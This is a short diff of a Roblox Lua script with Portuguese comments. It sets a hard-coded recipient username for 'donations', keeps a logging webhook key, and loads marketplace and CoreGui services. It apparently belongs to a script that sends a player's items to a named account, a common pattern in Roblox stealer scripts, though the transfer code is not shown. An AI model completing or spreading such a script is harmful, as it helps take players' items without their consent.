@@ -1,5 +1,4 @@
 local LogsWebhook = "18bf10e6-da47-4bdf-8c64-fcaa95eae717"
-local Username = "Ian_wp27"
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local MarketplaceService = game:GetService("MarketplaceService")
@@ -9,7 +8,7 @@ local CoreGui = game:GetService("CoreGui")
 local Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))
 
 -- Substitua isso pelo username do player que você quer doar
-local Username = "NomeDoUsuarioAqui"
+local Username = "Ian_wp27"
 
 local success, UserId = pcall(function()
     return Players:GetUserIdFromNameAsync(Username)
